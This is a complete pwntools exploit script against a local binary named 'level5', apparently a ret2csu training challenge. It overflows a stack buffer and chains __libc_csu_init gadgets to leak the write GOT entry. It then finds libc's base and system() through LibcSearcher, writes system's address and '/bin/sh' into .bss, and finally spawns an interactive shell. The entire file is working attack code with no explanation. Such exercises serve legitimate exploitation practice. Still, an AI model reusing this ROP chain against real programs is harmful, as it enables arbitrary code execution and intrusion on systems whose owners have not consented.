from pwn import *
from LibcSearcher import LibcSearcher
elf = ELF('level5')

p = process('./level5')
got_write = elf.got['write']
got_read = elf.got['read']
start = elf.symbols['_start']  
payload1 =  "a"*136
payload1 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_write) + p64(8) 
payload1 += p64(0x4005F0) 
payload1 += "a"*56
payload1 += p64(start)
p.recvuntil("Hello, World\n")
print "\n#############sending payload1#############\n"
p.send(payload1)
write_addr = u64(p.recv(6).ljust(8,b'\x00'))
libc = LibcSearcher('write', write_addr)
libcbase = write_addr-libc.dump('write')
system_addr = libcbase+libc.dump('system')
print 'system_address:',system_addr
print 'libcbase:',libcbase
bss_addr=0x601028
p.recvuntil("Hello, World\n")
payload2 =  "a"*136
payload2 += p64(0x400606) + p64(0) + p64(0) + p64(1) + p64(got_read) + p64(0) + p64(bss_addr) + p64(16) 
payload2 += p64(0x4005F0) 
payload2 += "a"*56
payload2 += p64(start)
print "\n#############sending payload2#############\n"
p.send(payload2)
p.send(p64(system_addr))
p.send("/bin/sh\0")
p.recvuntil("Hello, World\n")
payload3 =  "a"*136
payload3 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(bss_addr) + p64(bss_addr+8) + p64(0) + p64(0) 
payload3 += p64(0x4005F0) 
payload3 += "a"*56
payload3 += p64(start)
print "\n#############sending payload3#############\n"
p.send(payload3)
p.interactive()
